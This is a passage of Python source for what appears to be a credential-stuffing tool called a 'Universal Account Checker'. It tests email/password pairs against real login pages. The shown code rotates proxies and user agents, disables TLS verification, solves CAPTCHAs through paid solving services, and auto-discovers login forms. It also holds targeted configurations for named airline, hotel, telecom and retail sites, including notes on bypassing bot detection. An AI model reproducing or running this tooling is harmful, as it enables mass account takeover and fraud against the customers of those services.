import requests
import json
import time
import random
import threading
import concurrent.futures
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum
import urllib3
import os
import sys
from datetime import datetime
import logging
import re
import base64
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import hashlib
import csv
from pathlib import Path

# Enforced encrypted credit attribution (tamper detection)
_CREDIT_PAYLOAD = "bWFkZSBieSBATEVHRU5EX0JM"
_CREDIT_DIGEST = "5497a0ab3dd0cd3398ebf8514fe47abd3a2dd57c9a52aee7834901056b5ffbc0"


def _verify_credit_signature() -> str:
    """Validate encrypted credit attribution and abort if modified."""
    try:
        decoded = base64.b64decode(_CREDIT_PAYLOAD).decode("utf-8")
    except Exception as exc:
        raise RuntimeError("Credit verification failed: payload corrupted.") from exc

    if hashlib.sha256(decoded.encode("utf-8")).hexdigest() != _CREDIT_DIGEST or decoded != "made by @LEGEND_BL":
        raise RuntimeError("Credit verification failed: unauthorized modification detected.")
    return decoded


__CREDIT_AUTHOR__ = _verify_credit_signature()

# GUI imports (optional for headless mode)
try:
    import tkinter as tk
    from tkinter import ttk, filedialog, messagebox, scrolledtext
    from tkinter.font import Font as tkFont
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False
    print("WARNING: tkinter not available - GUI mode disabled, headless mode only")

# Selenium imports for enhanced login support
try:
    from selenium_captcha_solver import LocalCaptchaSolver
    from selenium_login_helper import SeleniumLoginHelper
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("WARNING: Selenium modules not available - advanced login features disabled")
    LocalCaptchaSolver = None
    SeleniumLoginHelper = None

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# CREDITS & DEVELOPER INFO
# ============================================================================
__version__ = "5.0 Advanced Edition"
__author__ = "Sarthak"
__telegram__ = "@legend_bl"
__email__ = ["sarthakgrid1@gmail.com", "sarthakgrid@gmail.com", "legendxkeygrid@gmail.com"]
__instagram__ = "sar_thak106"
__credits__ = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    UNIVERSAL ACCOUNT CHECKER v{__version__}                   ║
║                                                                              ║
║  Developer: {__author__}                                                         ║
║  Telegram: {__telegram__}                                                      ║
║  Email: {__email__[0]}                                          ║
║         {__email__[1]}                                             ║
║         {__email__[2]}                                       ║
║  Instagram: {__instagram__}                                                  ║
║                                                                              ║
║  For support, custom development, or inquiries, contact via Telegram/Email  ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
# ============================================================================

# Configure logging with more detail
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('universal_checker_debug.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# NEW: List of common, modern User-Agents for rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edge/119.0.0.0',
]

class ProxyType(Enum):
    HTTP = "http"
    HTTPS = "https"
    SOCKS4 = "socks4"
    SOCKS5 = "socks5"
    RESIDENTIAL = "residential"
    DATACENTER = "datacenter"
    ANY = "any"

class CheckStatus(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    RATE_LIMITED = "rate_limited"
    PROXY_ERROR = "proxy_error"
    TIMEOUT = "timeout"
    CONNECTION_ERROR = "connection_error"
    UNKNOWN_ERROR = "unknown_error"
    CAPTCHA_REQUIRED = "captcha_required"
    TWO_FACTOR_REQUIRED = "2fa_required"

class AuthMethod(Enum):
    FORM = "form"
    JSON_API = "json_api"
    BASIC_AUTH = "basic_auth"
    OAUTH = "oauth"
    UNKNOWN = "unknown"

# MODIFIED: Added captcha_present field
@dataclass
class LoginConfig:
    login_url: str
    auth_method: AuthMethod
    username_field: str
    password_field: str
    additional_fields: Dict[str, str]
    csrf_tokens: Dict[str, str]
    headers: Dict[str, str]
    success_indicators: List[str]
    failure_indicators: List[str]
    captcha_present: bool = False
    captcha_type: Optional[str] = None
    captcha_site_key: Optional[str] = None
    captcha_response_field: Optional[str] = None
    captcha_page_url: Optional[str] = None

@dataclass
class CheckResult:
    email: str
    password: str
    status: CheckStatus
    response: str
    proxy_used: Optional[str]
    response_time: float
    timestamp: datetime
    site: str
    auth_method: AuthMethod

class CaptchaSolverError(Exception):
    """Raised when automatic CAPTCHA solving fails."""
    pass


class CaptchaProvider(Enum):
    TWO_CAPTCHA = "2captcha"
    CLEAR_CAPTCHA = "clearcaptcha"


class CaptchaSolver:
    """Simple multi-provider CAPTCHA solver with polling support."""

    PROVIDER_ENDPOINTS = {
        CaptchaProvider.TWO_CAPTCHA: {
            "submit": "https://2captcha.com/in.php",
            "retrieve": "https://2captcha.com/res.php"
        },
        CaptchaProvider.CLEAR_CAPTCHA: {
            "submit": "https://api.clearcaptcha.com/in.php",
            "retrieve": "https://api.clearcaptcha.com/res.php"
        }
    }

    def __init__(self):
        self.provider_chain: List[Tuple[CaptchaProvider, str]] = []
        self.submit_timeout = 30
        self.poll_interval = 5
        self.max_wait_time = 180

    def configure(self, provider_chain: List[Tuple[CaptchaProvider, str]]):
        """Configure ordered providers with their API keys."""
        filtered: List[Tuple[CaptchaProvider, str]] = []
        seen = set()
        for provider, api_key in provider_chain:
            if not api_key:
                continue
            if isinstance(provider, str):
                provider_value = provider.strip().lower()
                if provider_value == CaptchaProvider.TWO_CAPTCHA.value:
                    provider = CaptchaProvider.TWO_CAPTCHA
                elif provider_value == CaptchaProvider.CLEAR_CAPTCHA.value:
                    provider = CaptchaProvider.CLEAR_CAPTCHA
                else:
                    logger.warning(f"Unknown CAPTCHA provider '{provider_value}' ignored")
                    continue
            if not isinstance(provider, CaptchaProvider):
                continue
            api_key = api_key.strip()
            if not api_key or provider in seen:
                continue
            seen.add(provider)
            filtered.append((provider, api_key))
        self.provider_chain = filtered

    def is_enabled(self) -> bool:
        return bool(self.provider_chain)

    def solve(self, captcha_type: Optional[str], site_key: Optional[str], page_url: str) -> Tuple[str, CaptchaProvider]:
        """Attempt to solve a CAPTCHA using the configured provider chain."""
        if not self.is_enabled():
            raise CaptchaSolverError("CAPTCHA solver is not configured")
        if not site_key:
            raise CaptchaSolverError("Missing site key; cannot solve CAPTCHA automatically")
        if not page_url:
            raise CaptchaSolverError("Missing page URL; cannot solve CAPTCHA automatically")

        last_error: Optional[Exception] = None
        for provider, api_key in self.provider_chain:
            try:
                token = self._solve_with_provider(provider, api_key, captcha_type, site_key, page_url)
                logger.info(f"CAPTCHA solved via {provider.value}")
                return token, provider
            except CaptchaSolverError as exc:
                last_error = exc
                logger.warning(f"{provider.value} solver failed: {exc}")
                continue

        raise last_error or CaptchaSolverError("All configured CAPTCHA providers failed")

    def _solve_with_provider(self, provider: CaptchaProvider, api_key: str,
                             captcha_type: Optional[str], site_key: str, page_url: str) -> str:
        """Submit and poll a CAPTCHA solution for a provider."""
        endpoints = self.PROVIDER_ENDPOINTS.get(provider)
        if not endpoints:
            raise CaptchaSolverError(f"Provider {provider.value} is not supported")

        payload = self._build_payload(api_key, captcha_type, site_key, page_url)

        try:
            with requests.Session() as session:
                submit_resp = session.post(endpoints["submit"], data=payload, timeout=self.submit_timeout)
                submit_resp.raise_for_status()
                submit_data = self._parse_response(submit_resp)
                if int(submit_data.get("status", 0)) != 1:
                    raise CaptchaSolverError(submit_data.get("request", "Unknown submission error"))

                captcha_id = submit_data.get("request")
                poll_params = {
                    "key": api_key,
                    "action": "get",
                    "id": captcha_id,
                    "json": 1
                }

                start_time = time.time()
                while time.time() - start_time < self.max_wait_time:
                    time.sleep(self.poll_interval)
                    poll_resp = session.get(endpoints["retrieve"], params=poll_params, timeout=self.submit_timeout)
                    poll_resp.raise_for_status()
                    poll_data = self._parse_response(poll_resp)
                    if int(poll_data.get("status", 0)) == 1:
                        return poll_data.get("request", "")

                    request_msg = (poll_data.get("request") or "").upper()
                    if request_msg not in ("CAPCHA_NOT_READY", "CAPTCHA_NOT_READY"):
                        raise CaptchaSolverError(poll_data.get("request", "Solver returned error"))

                raise CaptchaSolverError("CAPTCHA solving timed out")

        except requests.RequestException as exc:
            raise CaptchaSolverError(str(exc)) from exc

    def _build_payload(self, api_key: str, captcha_type: Optional[str],
                       site_key: str, page_url: str) -> Dict[str, Any]:
        """Build submission payload for supported CAPTCHA types."""
        payload: Dict[str, Any] = {
            "key": api_key,
            "json": 1,
            "pageurl": page_url
        }

        ctype = (captcha_type or "recaptcha").lower()
        if ctype in ("recaptcha", "recaptcha_v2", "recaptcha_v3", "grecaptcha"):
            payload.update({"method": "userrecaptcha", "googlekey": site_key})
        elif ctype == "hcaptcha":
            payload.update({"method": "hcaptcha", "sitekey": site_key})
        elif ctype == "turnstile":
            payload.update({"method": "turnstile", "sitekey": site_key})
        elif ctype in ("funcaptcha", "arkose"):
            payload.update({"method": "funcaptcha", "publickey": site_key, "surl": "https://client-api.arkoselabs.com"})
        else:
            payload.update({"method": "userrecaptcha", "googlekey": site_key})

        return payload

    def _parse_response(self, response: requests.Response) -> Dict[str, Any]:
        """Parse solver responses that may be in JSON or plain text."""
        try:
            data = response.json()
            if isinstance(data, dict):
                return data
        except ValueError:
            pass

        text = response.text.strip()
        if '|' in text:
            status_str, request_str = text.split('|', 1)
            status_val = 1 if status_str.upper() == "OK" else 0
            return {"status": status_val, "request": request_str}

        return {"status": 0, "request": text}


class AdvancedProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.proxy_types = {}
        self.proxy_stats = {}
        self.socks_available = False
        
        # Try to import SOCKS support
        try:
            import socks
            from urllib3.contrib.socks import SOCKSProxyManager
            self.socks_available = True
            logger.info("SOCKS proxy support is available")
        except ImportError:
            logger.warning("SOCKS proxy support not available. Install with: pip install requests[socks] or pip install PySocks")
    
    def detect_proxy_type(self, proxy: str) -> ProxyType:
        """Auto-detect proxy type from URL format"""
        proxy_lower = proxy.lower()
        
        if proxy_lower.startswith('socks5://'):
            return ProxyType.SOCKS5
        elif proxy_lower.startswith('socks4://'):
            return ProxyType.SOCKS4
        elif proxy_lower.startswith('https://'):
            return ProxyType.HTTPS
        elif proxy_lower.startswith('http://'):
            return ProxyType.HTTP
        else:
            # Default to HTTP if no protocol specified
            return ProxyType.HTTP
    
    def load_proxies_from_file(self, proxy_file: str):
        """Load proxies from file with auto-detection of type"""
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            loaded_count = 0
            for line in lines:
                line = line.strip()
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Detect proxy type
                proxy_type = self.detect_proxy_type(line)
                
                # Warn if SOCKS but not available
                if proxy_type in [ProxyType.SOCKS4, ProxyType.SOCKS5] and not self.socks_available:
                    logger.warning(f"Skipping SOCKS proxy (support not installed): {line}")
                    continue
                
                self.proxies.append(line)
                self.proxy_types[line] = proxy_type
                self.proxy_stats[line] = {'success': 0, 'fail': 0, 'last_used': None}
                loaded_count += 1
                
            logger.info(f"Loaded {loaded_count} proxies from {proxy_file}")
            return loaded_count
        except FileNotFoundError:
            logger.error(f"Proxy file not found: {proxy_file}")
            return 0
        except Exception as e:
            logger.error(f"Error loading proxies from {proxy_file}: {e}")
            return 0
        
    def load_proxies(self, proxy_file: str, proxy_type: ProxyType = ProxyType.HTTP):
        """Load proxies from file with type specification"""
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            loaded_count = 0
            for line in lines:
                line = line.strip()
                # Skip empty lines and comments
                if not line or line.startswith('#'):
                    continue
                
                # Check SOCKS availability
                if proxy_type in [ProxyType.SOCKS4, ProxyType.SOCKS5] and not self.socks_available:
                    logger.warning(f"Skipping SOCKS proxy (support not installed): {line}")
                    continue
                
                self.proxies.append(line)
                self.proxy_types[line] = proxy_type
                self.proxy_stats[line] = {'success': 0, 'fail': 0, 'last_used': None}
                loaded_count += 1
                
            logger.info(f"Loaded {loaded_count} {proxy_type.value} proxies from {proxy_file}")
            return loaded_count
        except FileNotFoundError:
            logger.error(f"Proxy file not found: {proxy_file}")
            return 0
        except Exception as e:
            logger.error(f"Error loading proxies from {proxy_file}: {e}")
            return 0
    
    def load_proxy_files(self, proxy_configs: Dict[ProxyType, str]):
        """Load multiple proxy files for different types"""
        total = 0
        for proxy_type, file_path in proxy_configs.items():
            if os.path.exists(file_path):
                total += self.load_proxies(file_path, proxy_type)
            else:
                logger.warning(f"Proxy file not found: {file_path}")
        return total
    
    def validate_proxy_format(self, proxy: str) -> bool:
        """Validate proxy format"""
        try:
            # Check if it has protocol
            if '://' in proxy:
                parts = proxy.split('://', 1)
                protocol = parts[0].lower()
                if protocol not in ['http', 'https', 'socks4', 'socks5']:
                    return False
                rest = parts[1]
            else:
                rest = proxy
            
            # Check for different formats:
            # Format 1: host:port:username:password (4 parts)
            # Format 2: username:password@host:port (contains @)
            # Format 3: host:port (2 parts, no @)
            
            parts = rest.split(':')
            
            if len(parts) == 4 and '@' not in rest:
                # Format: host:port:username:password
                host, port, username, password = parts
                if not host or not username or not password:
                    return False
                # Validate port
                try:
                    port_num = int(port)
                    if port_num < 1 or port_num > 65535:
                        return False
                except ValueError:
                    return False
                return True
            elif '@' in rest:
                # Format: username:password@host:port
                auth, hostport = rest.rsplit('@', 1)
                if ':' not in auth:
                    return False
                if ':' not in hostport:
                    return False
                host, port = hostport.rsplit(':', 1)
                if not host or not port:
                    return False
                # Validate port
                try:
                    port_num = int(port)
                    if port_num < 1 or port_num > 65535:
                        return False
                except ValueError:
                    return False
                return True
            elif len(parts) == 2:
                # Format: host:port (no authentication)
                host, port = parts
                if not host or not port:
                    return False
                # Validate port
                try:
                    port_num = int(port)
                    if port_num < 1 or port_num > 65535:
                        return False
                except ValueError:
                    return False
                return True
            else:
                return False
            
        except Exception:
            return False
    
    def format_proxy_url(self, proxy: str, proxy_type: ProxyType) -> str:
        """Format proxy URL based on type and authentication"""
        try:
            # Check if proxy already has protocol
            if proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                return proxy
            
            # Determine the protocol based on proxy type
            if proxy_type == ProxyType.SOCKS5:
                protocol = "socks5"
            elif proxy_type == ProxyType.SOCKS4:
                protocol = "socks4"
            elif proxy_type == ProxyType.HTTPS:
                protocol = "https"
            else:  # HTTP or ANY
                protocol = "http"
            
            # Check for different proxy formats
            # Format 1: host:port:username:password
            # Format 2: username:password@host:port
            # Format 3: host:port
            
            parts = proxy.split(':')
            
            if len(parts) == 4:
                # Format: host:port:username:password
                host, port, username, password = parts
                return f"{protocol}://{username}:{password}@{host}:{port}"
            elif len(parts) == 2:
                # Format: host:port (no authentication)
                return f"{protocol}://{proxy}"
            elif '@' in proxy:
                # Format: username:password@host:port (already in proper format minus protocol)
                return f"{protocol}://{proxy}"
            else:
                # Unknown format, just add protocol
                return f"{protocol}://{proxy}"
                
        except Exception as e:
            logger.error(f"Error formatting proxy URL: {e}")
            return f"http://{proxy}"
    
    def get_proxy(self, preferred_type: ProxyType = None, use_proxies: bool = True) -> Optional[Dict]:
        """Get a random proxy with better error handling and full support for all types"""
        if not use_proxies:
            logger.debug("get_proxy called with use_proxies=False")
            return None
            
        if not self.proxies:
            logger.warning(f"get_proxy: No proxies loaded (use_proxies={use_proxies})")
            return None
            
        try:
            available_proxies = self.proxies.copy()
            
            # Filter by preferred type if specified and not "ANY"
            if preferred_type and preferred_type != ProxyType.ANY:
                filtered = [p for p in self.proxies if self.proxy_types.get(p) == preferred_type]
                if filtered:
                    available_proxies = filtered
                else:
                    logger.debug(f"No proxies of type {preferred_type}, using ANY type")
            
            if not available_proxies:
                logger.warning("No proxies available after filtering")
                return None
            
            # Try up to 3 proxies in case some are invalid
            max_attempts = min(3, len(available_proxies))
            for attempt in range(max_attempts):
                try:
                    # Select random proxy
                    proxy = random.choice(available_proxies)
                    proxy_type = self.proxy_types.get(proxy, ProxyType.HTTP)
                    
                    # Skip SOCKS if not available
                    if proxy_type in [ProxyType.SOCKS4, ProxyType.SOCKS5] and not self.socks_available:
                        logger.debug(f"Skipping SOCKS proxy (support not available): {proxy}")
                        available_proxies.remove(proxy)
                        continue
                    
                    # Validate proxy format before using
                    if not self.validate_proxy_format(proxy):
                        logger.warning(f"Invalid proxy format, skipping: {proxy}")
                        available_proxies.remove(proxy)
                        continue
                    
                    # Format proxy URL
                    proxy_url = self.format_proxy_url(proxy, proxy_type)
                    
                    if not proxy_url or '://' not in proxy_url:
                        logger.warning(f"Failed to format proxy: {proxy}")
                        available_proxies.remove(proxy)
                        continue
                    
                    # Update stats
                    self.proxy_stats[proxy]['last_used'] = datetime.now()
                    
                    # Return proxy dict for requests
                    # Both http and https keys use the same proxy
                    proxy_dict = {
                        'http': proxy_url,
                        'https': proxy_url
                    }
                    
                    logger.debug(f"Selected {proxy_type.value} proxy: {proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url}")
                    return proxy_dict
                    
                except Exception as e:
                    logger.debug(f"Error with proxy {proxy}: {e}")
                    if proxy in available_proxies:
                        available_proxies.remove(proxy)
                    continue
            
            logger.warning(f"Could not find valid proxy after {max_attempts} attempts (total proxies: {len(self.proxies)})")
            return None
                
        except Exception as e:
            logger.error(f"Error getting proxy: {e}")
            return None
    
    def get_proxy_count(self, proxy_type: ProxyType = None) -> int:
        """Get count of available proxies by type"""
        if not proxy_type:
            return len(self.proxies)
        return len([p for p in self.proxies if self.proxy_types.get(p) == proxy_type])
    
    def mark_proxy_result(self, proxy: str, success: bool):
        """Update proxy statistics"""
        if proxy in self.proxy_stats:
            if success:
                self.proxy_stats[proxy]['success'] += 1
            else:
                self.proxy_stats[proxy]['fail'] += 1
    
    def get_best_proxies(self, count: int = 10) -> List[str]:
        """Get best performing proxies based on success rate"""
        scored_proxies = []
        for proxy in self.proxies:
            stats = self.proxy_stats[proxy]
            total = stats['success'] + stats['fail']
            if total > 0:
                success_rate = stats['success'] / total
            else:
                success_rate = 0.5  # Default for unused proxies
            scored_proxies.append((proxy, success_rate))
        
        scored_proxies.sort(key=lambda x: x[1], reverse=True)
        return [proxy for proxy, score in scored_proxies[:count]]

class UniversalSiteAnalyzer:
    """Advanced analyzer to detect login forms and authentication methods"""
    
    def __init__(self):
        # Site-specific configurations for better detection (with actual working URLs)
        self.site_specific_configs = {
            'accor.com': {
                'login_paths': ['/account/login', '/loyalty/login', '/login', '/en/login', '/signin'],
                'username_fields': ['email', 'username', 'login', 'emailAddress', 'user_login'],
                'password_fields': ['password', 'pwd', 'user_password'],
                'api_endpoints': ['/api/login', '/api/auth/login', '/api/v1/auth'],
                'working_url': 'https://all.accor.com/account/login'
            },
            'flyfrontier.com': {
                'login_paths': ['/login', '/travel/login', '/mytrip/login', '/account/login', '/signin'],
                'username_fields': ['email', 'username', 'confirmationCode', 'lastName', 'login'],
                'password_fields': ['password', 'confirmationCode', 'pwd'],
                'api_endpoints': ['/api/auth', '/api/login', '/travel/api/login'],
                'working_url': 'https://www.flyfrontier.com/login'
            },
            'ihg.com': {
                'login_paths': ['/rewardsclub/us/en/sign-in', '/rewardsclub/sign-in', '/account/signin', 
                               '/login', '/signin', '/rewardsclub/content/gb/en/sign-in'],
                'username_fields': ['email', 'emailAddress', 'memberNumber', 'username', 'login'],
                'password_fields': ['password', 'pin', 'pwd'],
                'api_endpoints': ['/rewardsclub/api/signin', '/api/auth', '/api/member/authenticate'],
                'working_url': 'https://www.ihg.com/rewardsclub/us/en/sign-in'
            },
            'sky.com': {
                'login_paths': ['/signin', '/myskylogin', '/myaccount/signin', '/login', '/account/login'],
                'username_fields': ['username', 'email', 'skyId', 'userId', 'login'],
                'password_fields': ['password', 'pass', 'pwd'],
                'api_endpoints': ['/api/signin', '/api/auth/login', '/auth/api/login'],
                'working_url': 'https://www.sky.com/signin'
            },
            'virginmediao2.co.uk': {
                'login_paths': ['/login', '/signin', '/myaccount/login', '/myo2/signin', '/account/login'],
                'username_fields': ['username', 'email', 'phoneNumber', 'mobileNumber', 'login'],
                'password_fields': ['password', 'pin', 'pass', 'pwd'],
                'api_endpoints': ['/api/auth', '/api/login', '/auth/signin'],
                'working_url': 'https://www.o2.co.uk/login'
            },
            'allheartistsorders.com': {
                'login_paths': ['/auth/login', '/login', '/account/login', '/customer/login', '/signin', '/myaccount'],
                'username_fields': ['email', 'username', 'customer_email', 'login', 'user'],
                'password_fields': ['password', 'pass', 'pwd'],
                'api_endpoints': ['/api/login', '/api/customer/login', '/account/api/signin'],
                'working_url': 'https://allheartistsorders.com/auth/login/'
            }
        }
        
        self.common_login_paths = [
            '/login', '/signin', '/auth', '/authentication',
            '/account/login', '/user/login', '/member/login',
            '/api/login', '/api/auth', '/api/v1/auth/login',
            '/oauth', '/sso', '/secure',
            # Extended paths for better coverage
            '/sign-in', '/sign_in', '/log-in', '/log_in',
            '/accounts/login', '/accounts/signin', '/users/sign_in',
            '/customer/login', '/customer/account/login',
            '/my-account', '/myaccount', '/portal/login',
            '/auth/login', '/auth/signin', '/authorize',
            '/session/new', '/sessions/new',
            '/api/v2/auth/login', '/api/v2/login', '/api/v3/auth',
            '/rest/login', '/rest/auth', '/rest/v1/auth',
            '/graphql', '/api/session', '/api/sessions',
            '/connect', '/identity/connect', '/identity/account/login',
            '/user/signin', '/users/login', '/member/signin',
            # Additional paths for booking and hotel sites
            '/rewardsclub/sign-in', '/loyalty/login', '/rewards/signin',
            '/travel/login', '/booking/login', '/reservation/login',
            '/mytrip/login', '/trips/signin', '/manage-booking/login',
            # Media and telecom sites
            '/myskylogin', '/myaccount/signin', '/myo2/signin',
            # E-commerce extensions
            '/checkout/login', '/order/login', '/track-order/signin'
        ]
        
        self.username_fields = [
            'email', 'username', 'user', 'login', 'userid',
            'user_name', 'userid', 'account', 'mail',
            # Extended username fields
            'emailaddress', 'email_address', 'user_email',
            'loginid', 'login_id', 'user_id', 'user-id',
            'accountid', 'account_id', 'accountname',
            'mailaddress', 'e-mail', 'e_mail',
            'customer_email', 'useremail', 'loginname',
            'uname', 'u_name', 'memberid', 'member_id',
            'identifier', 'principal', 'credential'
        ]
        
        self.password_fields = [
            'password', 'pass', 'pwd', 'passwd', 'userpassword'
        ]
        
        self.success_indicators = [
            'success', 'authenticated', 'loggedin', 'welcome',
            'dashboard', 'profile', 'account', 'logout',
            'access_token', 'refresh_token', 'token',
            # Extended success indicators
            'login successful', 'authentication successful',
            'logged in', 'sign in successful', 'signin successful',
            'authentication succeeded', 'auth success',
            'session', 'user authenticated', 'login success',
            'welcome back', 'hello', 'my account',
            'sign out', 'signout', 'log out',
            'access granted', 'authorization successful',
            'bearer', 'jwt', 'session_id', 'sessionid'
        ]
        
        self.failure_indicators = [
            'error', 'invalid', 'incorrect', 'failed', 'failure',
            'wrong', 'unauthorized', 'denied', 'rejected',
            # Extended failure indicators
            'authentication failed', 'login failed', 'signin failed',
            'invalid credentials', 'invalid username', 'invalid password',
            'wrong password', 'wrong username', 'wrong credentials',
            'incorrect password', 'incorrect username',
            'user not found', 'account not found',
            'authentication error', 'login error', 'auth failed',
            'access denied', 'forbidden', 'not authorized',
            'bad credentials', 'invalid login', 'failed to authenticate',
            'unable to authenticate', 'authentication unsuccessful'
        ]

    def _get_site_specific_config(self, base_url: str) -> Optional[Dict]:
        """Get site-specific configuration if available"""
        parsed_url = urlparse(base_url)
        domain = parsed_url.netloc.lower()
        
        # Remove www. prefix if present
        if domain.startswith('www.'):
            domain = domain[4:]
        
        # Check if we have a specific configuration for this domain
        for site_key, config in self.site_specific_configs.items():
            if site_key in domain:
                logger.info(f"Found site-specific configuration for {site_key}")
                return config
        
        return None

    def analyze_site(self, base_url: str, proxy: Optional[Dict] = None, timeout: int = 30) -> LoginConfig:
        """Analyze a website to find login forms and authentication methods"""
        session = requests.Session()
        session.verify = False
        
        # Set headers
        session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Get site-specific configuration if available
        site_config = self._get_site_specific_config(base_url)
        
        # If we have a known working URL for this site, try it first
        if site_config and 'working_url' in site_config:
            try:
                logger.info(f"Trying known working URL: {site_config['working_url']}")
                working_response = session.get(site_config['working_url'], proxies=proxy, timeout=10, allow_redirects=True)
                if working_response.status_code == 200:
                    login_config = self._find_login_form(working_response.text, working_response.url, site_config)
                    if login_config:
                        logger.info(f"Successfully found login form at known working URL")
                        return login_config
            except Exception as e:
                logger.debug(f"Error trying working URL: {e}")
        
        try:
            # First, try to access the main page
            try:
                main_response = session.get(base_url, proxies=proxy, timeout=timeout, allow_redirects=True)
                final_url = main_response.url
                main_html = main_response.text

                # Domain-specific overrides for known complex sites
                domain = urlparse(final_url).netloc.lower()
                override_config = self._handle_known_sites(domain, final_url, main_html)
                if override_config:
                    return override_config
            except Exception as e:
                logger.error(f"Error accessing main page {base_url}: {e}")
                return self._create_default_config(base_url)
            
            # Look for login forms on the main page
            login_config = self._find_login_form(main_html, final_url, site_config)
            if login_config:
                logger.info(f"Found login form on main page: {final_url}")
                return login_config
            
            # Look for login links in the HTML before trying paths
            login_links = self._extract_login_links_from_html(main_html, final_url)
            for link in login_links[:5]:  # Try first 5 detected links
                try:
                    logger.info(f"Trying detected login link: {link}")
                    link_response = session.get(link, proxies=proxy, timeout=10, allow_redirects=True)
                    
                    if link_response.status_code == 200:
                        login_config = self._find_login_form(link_response.text, link_response.url, site_config)
                        if login_config:
                            logger.info(f"Found login form at detected link: {link}")
                            return login_config
                except Exception as e:
                    logger.debug(f"Error trying login link {link}: {e}")
                    continue
            
            # Prepare login paths to try (site-specific first, then common)
            login_paths = self.common_login_paths.copy()
            if site_config and 'login_paths' in site_config:
                # Prepend site-specific paths to prioritize them
                login_paths = site_config['login_paths'] + login_paths
            
            # If no form found on main page, try login paths
            for path in login_paths:
                try:
                    login_url = urljoin(final_url, path)
                    logger.debug(f"Trying login path: {login_url}")
                    login_response = session.get(login_url, proxies=proxy, timeout=10, allow_redirects=True)
                    
                    if login_response.status_code == 200:
                        login_config = self._find_login_form(login_response.text, login_response.url, site_config)
                        if login_config:
                            logger.info(f"Found login form at path: {path}")
                            return login_config
                except Exception as e:
                    logger.debug(f"Error trying path {path}: {e}")
                    continue
            
            # If still no form found, try to detect API endpoints (scan page HTML too)
            api_config = self._detect_api_endpoints(session, final_url, main_html, proxy, timeout, site_config)
            if api_config:
                logger.info(f"Found API endpoint: {api_config.login_url}")
                return api_config
                
        except Exception as e:
            logger.error(f"Error analyzing site {base_url}: {e}")
        
        # Return default config if nothing found
        logger.warning(f"Could not find login for {base_url}, using default config")
        return self._create_default_config(base_url)

    def _handle_known_sites(self, domain: str, final_url: str, html: str) -> Optional[LoginConfig]:
        """Return a LoginConfig for known complex domains if detected."""
        if not domain:
            return None

        if domain.endswith("all.accor.com"):
            return self._handle_accor_site(final_url, html)

        if domain.endswith("flyfrontier.com") or domain.endswith("www.flyfrontier.com"):
            return self._handle_flyfrontier_site(final_url)

        if domain.endswith("sky.com") or domain.endswith("www.sky.com"):
            return self._handle_sky_site(html)

        if domain.endswith("virginmediao2.co.uk") or domain.endswith("www.virginmediao2.co.uk"):
            return self._handle_virginmediao2_site(html)

        if domain.endswith("ihg.com") or domain.endswith("www.ihg.com"):
            return self._handle_ihg_site(final_url)

        return None

    def _handle_accor_site(self, final_url: str, html: str) -> LoginConfig:
        """Construct login information for all.accor.com which uses CustomerAPI OAuth."""
        lang_match = re.search(r'<html[^>]+lang=["\']([a-zA-Z\-]+)["\']', html, re.I)
        lang = "en"
        if lang_match:
            lang = lang_match.group(1).split("-")[0].lower() or "en"

        redirect_site = final_url or "https://all.accor.com/"
        params = {
            "appId": "all.accor",
            "ui_locales": lang,
            "redirect_uri": "https://all.accor.com/loyalty-funnel/check-authent.html",
            "redirect_site_uri": redirect_site,
        }
        login_url = f"https://api.accor.com/authentication/v2.0/authorization?{urlencode(params)}"

        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "User-Agent": random.choice(USER_AGENTS),
        }

        return LoginConfig(
            login_url=login_url,
            auth_method=AuthMethod.OAUTH,
            username_field="email",
            password_field="password",
            additional_fields={},
            csrf_tokens={},
            headers=headers,
            success_indicators=self.success_indicators,
            failure_indicators=self.failure_indicators,
            captcha_present=False,
            captcha_page_url=final_url
        )

    def _handle_flyfrontier_site(self, final_url: str) -> LoginConfig:
        """FlyFrontier login uses the CorpLogin form endpoint with PerimeterX headers."""
        referer = final_url or "https://www.flyfrontier.com/"
        login_url = "https://booking.flyfrontier.com/api/CorpLogin"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://www.flyfrontier.com",
            "Referer": referer,
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": random.choice(USER_AGENTS),
        }

        return LoginConfig(
